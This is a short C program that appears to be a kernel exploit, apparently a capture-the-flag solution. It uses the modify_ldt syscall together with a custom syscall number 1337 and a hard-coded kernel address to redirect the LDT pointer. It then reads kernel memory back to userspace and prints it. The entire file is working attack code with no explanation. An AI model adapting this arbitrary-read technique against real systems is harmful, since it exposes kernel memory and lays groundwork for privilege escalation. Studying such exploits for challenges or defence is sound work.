#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>

/* Assert that a syscall x has succeeded. */
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
        fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
        exit(1); \
    } \
    __res; \
})

struct user_desc {
               unsigned int  entry_number;
               unsigned int  base_addr;
               unsigned int  limit;
               unsigned int  seg_32bit:1;
               unsigned int  contents:2;
               unsigned int  read_exec_only:1;
               unsigned int  limit_in_pages:1;
               unsigned int  seg_not_present:1;
               unsigned int  useable:1;
};

#define LDT 0xffff880000000000ul

int main () {
    char buf[0x128] = {};
    struct user_desc desc = {
        .base_addr = 0x1337000,
        .entry_number = 100
    };

    SYSCHK(syscall(SYS_modify_ldt, 1, &desc, sizeof(desc)));
    desc.entry_number = 1;
    
    SYSCHK(syscall(1337, LDT));
    SYSCHK(syscall(SYS_modify_ldt, 0, buf, 0x128));
    write(1, buf, 0x128);
    
    return 0;
}
